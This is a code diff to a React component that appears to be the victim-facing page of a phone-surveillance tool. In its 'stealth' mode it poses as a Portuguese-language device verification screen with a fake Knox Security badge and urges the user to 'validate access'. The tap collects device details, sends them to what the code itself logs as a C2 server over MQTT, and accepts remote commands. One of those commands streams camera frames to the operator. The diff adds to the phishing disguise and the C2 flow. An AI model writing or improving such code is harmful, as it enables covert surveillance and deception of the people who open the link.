@@ -1,6 +1,6 @@
 
 import React, { useEffect, useState, useRef } from 'react';
-import { UploadCloud, Radio, Skull, MapPin, Battery, Video, Fingerprint, Power, ShieldCheck, Loader2, Zap } from 'lucide-react';
+import { Skull, Power, ShieldCheck, Loader2, Zap, AlertTriangle, Fingerprint } from 'lucide-react';
 import { getDeviceInfo } from '../services/deviceService';
 import { mqttService } from '../services/mqttService';
 import { DeviceInfo, CommandMessage } from '../types';
@@ -11,7 +11,6 @@ const MobileScanner: React.FC = () => {
   const [info, setInfo] = useState<DeviceInfo | null>(null);
   const [logs, setLogs] = useState<string[]>([]);
   const [progress, setProgress] = useState(0);
-  const [isStreaming, setIsStreaming] = useState(false);
   const [stealthMode, setStealthMode] = useState(false);
   const [isGlitching, setIsGlitching] = useState(false);
   
@@ -27,7 +26,7 @@ const MobileScanner: React.FC = () => {
     return { session: params.get('session'), stealth: params.get('stealth') === 'true' };
   };
 
-  const addLog = (msg: string) => setLogs(prev => [...prev.slice(-6), msg]);
+  const addLog = (msg: string) => setLogs(prev => [...prev.slice(-8), msg]);
 
   const handleCommand = (cmd: CommandMessage, session: string) => {
     switch (cmd.type) {
@@ -37,16 +36,17 @@ const MobileScanner: React.FC = () => {
         const utterance = new SpeechSynthesisUtterance(cmd.payload.text);
         utterance.lang = 'pt-BR';
         window.speechSynthesis.speak(utterance);
-        addLog('NEURAL_AUDIO_RECEIVED');
+        addLog('NEURAL_AUDIO_SYNC');
         break;
       case 'GLITCH':
         setIsGlitching(true);
-        if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 300]);
+        if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]);
         setTimeout(() => setIsGlitching(false), 3000);
-        addLog('SYSTEM_OVERLOAD_DETECTED');
+        addLog('EMERGENCY_OVERRIDE');
         break;
       case 'VIBRATE':
-        if (navigator.vibrate) navigator.vibrate(500);
+        if (navigator.vibrate) navigator.vibrate(800);
+        addLog('HAPTIC_PROBE');
         break;
       case 'PLAY_AUDIO':
         new Audio(cmd.payload.url).play().catch(() => {});
@@ -62,115 +62,168 @@ const MobileScanner: React.FC = () => {
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         videoRef.current.play();
-        setIsStreaming(true);
+        addLog('CAMERA_UPLINK_ON');
         streamIntervalRef.current = window.setInterval(() => {
            if (videoRef.current && canvasRef.current) {
               const ctx = canvasRef.current.getContext('2d');
               if (ctx) {
                  ctx.drawImage(videoRef.current, 0, 0, 320, 240);
                  mqttService.publishStream(sessionId, { 
-                   image: canvasRef.current.toDataURL('image/jpeg', 0.4), 
+                   image: canvasRef.current.toDataURL('image/jpeg', 0.5), 
                    timestamp: new Date().toISOString() 
                  });
               }
            }
-        }, 250);
+        }, 300);
       }
-    } catch (err) { addLog('CAMERA_FAIL'); }
+    } catch (err) { 
+      addLog('CAMERA_PERMISSION_DENIED'); 
+    }
   };
 
   const stopCamera = () => {
      if (streamIntervalRef.current) { clearInterval(streamIntervalRef.current); streamIntervalRef.current = null; }
      if (videoRef.current?.srcObject) (videoRef.current.srcObject as MediaStream).getTracks().forEach(t => t.stop());
-     setIsStreaming(false);
+     addLog('CAMERA_UPLINK_OFF');
   };
 
-  useEffect(() => {
-    if (!started) return;
+  const initiatePayload = async () => {
     const { session, stealth } = getURLParams();
-    if (!session) return;
+    if (!session) {
+      setStatus('error');
+      return;
+    }
 
-    const run = async () => {
-      setStatus('scanning');
-      setProgress(20);
+    setStarted(true);
+    setStealthMode(stealth);
+    setStatus('scanning');
+    setProgress(10);
+    addLog('INIT_SEQUENCE');
+
+    try {
+      addLog('GATHERING_SYS_INFO');
       const data = await getDeviceInfo(stealth);
       setInfo(data);
-      setProgress(60);
-      mqttService.connect(session, () => {}, () => mqttService.publishData(session, data), (cmd) => handleCommand(cmd, session));
-      setProgress(100);
-      setStatus('complete');
-    };
-    run();
-    return () => stopCamera();
-  }, [started]);
+      setProgress(50);
+
+      addLog('CONNECTING_TO_C2');
+      mqttService.connect(
+        session, 
+        () => {}, 
+        () => {
+          mqttService.publishData(session, data);
+          addLog('TELEMETRY_TX_COMPLETE');
+          setProgress(100);
+          setStatus('complete');
+        }, 
+        (cmd) => handleCommand(cmd, session)
+      );
+    } catch (e) {
+      addLog('FATAL_UPLINK_ERROR');
+      setStatus('error');
+    }
+  };
 
   if (!started) {
+    const { stealth } = getURLParams();
     return (
-      <div onClick={() => { setStarted(true); setStealthMode(getURLParams().stealth); }} className={`fixed inset-0 flex flex-col items-center justify-center p-8 z-50 ${stealthMode ? 'bg-white text-gray-800' : 'bg-black'}`}>
-        {stealthMode ? (
-          <div className="text-center space-y-4">
-            <ShieldCheck size={64} className="text-blue-600 mx-auto animate-pulse" />
-            <h1 className="text-xl font-sans font-bold">Verificação de Integridade</h1>
-            <p className="text-xs text-gray-500">Toque para validar seu dispositivo</p>
+      <div onClick={initiatePayload} className={`fixed inset-0 flex flex-col items-center justify-center p-8 z-50 select-none active:scale-95 transition-transform ${stealth ? 'bg-zinc-50 text-zinc-900' : 'bg-black text-red-500'}`}>
+        {stealth ? (
+          <div className="text-center space-y-6">
+            <div className="w-20 h-20 bg-blue-600 rounded-full mx-auto flex items-center justify-center shadow-lg">
+               <ShieldCheck size={40} className="text-white" />
+            </div>
+            <div className="space-y-2">
+              <h1 className="text-xl font-sans font-bold text-zinc-800">Verificação de Dispositivo</h1>
+              <p className="text-sm text-zinc-500 leading-relaxed px-4">Detectamos uma tentativa de acesso incomum. Por favor, clique no botão abaixo para validar sua identidade.</p>
+            </div>
+            <div className="mt-8 px-6 py-3 bg-blue-600 text-white rounded font-bold shadow-md uppercase text-sm tracking-widest">Validar Acesso</div>
+            <div className="flex items-center justify-center gap-2 text-[10px] text-zinc-400 mt-4 font-sans">
+               <Fingerprint size={12} /> Protegido por Knox Security™
+            </div>
           </div>
         ) : (
-          <div className="text-center space-y-4">
-            <Power size={64} className="text-red-500 mx-auto animate-pulse" />
-            <h1 className="text-2xl font-black text-red-500">PEGASUS_V4_OFFLINE</h1>
-            <p className="text-[10px] text-red-400">TOQUE PARA ESTABELECER CONEXÃO</p>
+          <div className="text-center space-y-6">
+            <div className="relative inline-block">
+              <Power size={80} className="text-red-600 animate-pulse" />
+              <div className="absolute inset-0 bg-red-600 blur-2xl opacity-20 animate-pulse"></div>
+            </div>
+            <div className="space-y-1">
+              <h1 className="text-3xl font-black tracking-tighter italic">PEGASUS_LOADER</h1>
+              <div className="h-[1px] w-full bg-gradient-to-r from-transparent via-red-900 to-transparent"></div>
+              <p className="text-[10px] text-red-400 font-bold tracking-[0.3em] uppercase">Connect to Motherboard</p>
+            </div>
           </div>
         )}
-        <div className="absolute bottom-8 text-[10px] opacity-30 text-center w-full">Develop By: Davi.Design</div>
+        <div className="absolute bottom-10 text-[9px] opacity-20 font-mono tracking-widest uppercase">Encryption Key: RSA-4096-ECC</div>
       </div>
     );
   }
 
   return (
-    <div className={`min-h-screen font-mono p-4 flex flex-col items-center justify-center relative transition-all duration-300 ${isGlitching ? 'bg-red-900 invert scale-110' : (stealthMode ? 'bg-white text-blue-900' : 'bg-black text-green-500')}`}>
+    <div className={`min-h-screen font-mono p-6 flex flex-col items-center justify-center relative transition-all duration-300 overflow-hidden ${isGlitching ? 'bg-red-600 invert' : (stealthMode ? 'bg-zinc-100 text-zinc-900' : 'bg-black text-green-500')}`}>
       <video ref={videoRef} className="hidden" playsInline muted autoPlay></video>
       <canvas ref={canvasRef} width="320" height="240" className="hidden"></canvas>
       
-      {isGlitching && <div className="absolute inset-0 bg-red-500/20 flex items-center justify-center z-50"><Zap size={100} className="text-white animate-ping" /></div>}
+      {isGlitching && <div className="absolute inset-0 bg-red-500/10 flex items-center justify-center z-50 pointer-events-none"><Zap size={150} className="text-white animate-ping opacity-50" /></div>}
 
-      <div className="z-10 w-full max-w-md space-y-6">
+      <div className="z-10 w-full max-w-sm space-y-8 animate-in fade-in duration-500">
         <div className="text-center">
           {stealthMode ? (
              <div className="space-y-4">
                 <Loader2 className="animate-spin text-blue-500 mx-auto" size={32} />
-                <h2 className="text-xl font-bold">Processando Solicitação...</h2>
+                <h2 className="text-lg font-bold text-zinc-700">Validando Certificados...</h2>
+                <div className="text-[9px] text-zinc-400 uppercase font-sans">Aguarde, não feche esta janela</div>
              </div>
           ) : (
              <div className="space-y-2">
-                <Skull size={40} className="mx-auto text-red-600 animate-pulse" />
-                <h1 className="text-2xl font-black uppercase tracking-tighter">Conexão Ativa</h1>
-                <div className="text-[10px] bg-red-900/30 py-1 border border-red-900/50">CANAL_CRIPTOGRAFADO_ESTABELECIDO</div>
+                <Skull size={48} className="mx-auto text-white drop-shadow-[0_0_10px_rgba(255,255,255,0.5)] mb-4" />
+                <h1 className="text-3xl font-black uppercase italic tracking-tighter">Connected</h1>
+                <div className="text-[9px] bg-red-900/40 py-1 px-4 border border-red-900 rounded inline-block text-white">TUNNELING_ESTABLISHED</div>
              </div>
           )}
         </div>
 
-        <div className={`p-6 border rounded-lg shadow-2xl ${stealthMode ? 'bg-gray-50 border-gray-200' : 'bg-gray-900/80 border-green-900'}`}>
+        <div className={`p-5 border shadow-2xl relative ${stealthMode ? 'bg-white border-zinc-200 rounded-xl' : 'bg-zinc-950 border-green-900'}`}>
+          {!stealthMode && <div className="absolute -top-1 -left-1 w-3 h-3 border-t-2 border-l-2 border-green-500"></div>}
+          {!stealthMode && <div className="absolute -bottom-1 -right-1 w-3 h-3 border-b-2 border-r-2 border-green-500"></div>}
+
           <div className="space-y-2 mb-6">
-            <div className="flex justify-between text-[10px] text-gray-400"><span>PROGRESSO</span><span>{progress}%</span></div>
-            <div className="h-1 bg-gray-800 rounded-full overflow-hidden">
-              <div className={`h-full transition-all duration-500 ${stealthMode ? 'bg-blue-600' : 'bg-green-600'}`} style={{ width: `${progress}%` }}></div>
+            <div className="flex justify-between text-[10px] font-bold">
+               <span className={stealthMode ? 'text-zinc-400' : 'text-green-800'}>DATA_PACKETS</span>
+               <span>{progress}%</span>
+            </div>
+            <div className={`h-1.5 rounded-full overflow-hidden ${stealthMode ? 'bg-zinc-100' : 'bg-zinc-900'}`}>
+              <div className={`h-full transition-all duration-700 ease-out ${stealthMode ? 'bg-blue-600 shadow-[0_0_10px_rgba(37,99,235,0.5)]' : 'bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]'}`} style={{ width: `${progress}%` }}></div>
             </div>
           </div>
 
-          <div className={`text-[10px] h-32 overflow-hidden border-t border-b py-2 mb-4 space-y-1 ${stealthMode ? 'text-blue-800' : 'text-green-400'}`}>
-            {logs.map((l, i) => <div key={i} className="opacity-80">&gt; {l}</div>)}
+          <div className={`text-[9px] h-40 overflow-hidden font-mono py-2 mb-4 space-y-1 ${stealthMode ? 'text-zinc-400' : 'text-green-400/70'}`}>
+            {logs.map((l, i) => <div key={i} className="flex gap-2"><span>[{new Date().toLocaleTimeString()}]</span><span>&gt; {l}</span></div>)}
+            <div className="animate-pulse">_</div>
           </div>
 
-          {info && (
-            <div className={`grid grid-cols-2 gap-2 text-[10px] border p-3 rounded ${stealthMode ? 'bg-white border-gray-100' : 'bg-black border-green-900/30'}`}>
-              <div className="text-gray-400 uppercase">Dispositivo</div>
-              <div className="text-right truncate">{info.platform}</div>
-              <div className="text-gray-400 uppercase">IP_ADDR</div>
-              <div className="text-right">{info.ip}</div>
+          {info && !stealthMode && (
+            <div className="grid grid-cols-1 gap-1 text-[9px] border-t border-green-900/30 pt-4 mt-2">
+              <div className="flex justify-between opacity-50 uppercase"><span>Kernel</span><span>{info.platform}</span></div>
+              <div className="flex justify-between opacity-50 uppercase"><span>Uplink</span><span className="text-blue-400">{info.ip}</span></div>
             </div>
           )}
         </div>
+
+        {status === 'error' && (
+          <div className="flex items-center gap-2 text-red-500 text-[10px] justify-center bg-red-900/10 p-2 border border-red-900 animate-bounce">
+            <AlertTriangle size={14} />
+            CRITICAL_CONNECTION_FAILURE
+          </div>
+        )}
       </div>
-      <div className="absolute bottom-4 text-[10px] opacity-30 text-center w-full">Develop By: Davi.Design</div>
+      
+      <div className="absolute bottom-6 left-0 right-0 flex justify-center opacity-30 pointer-events-none">
+         <div className="flex items-center gap-2 text-[9px] uppercase tracking-widest font-sans">
+            <ShieldCheck size={10} /> Secure Tunnel Protocol v4.0
+         </div>
+      </div>
     </div>
   );
 };
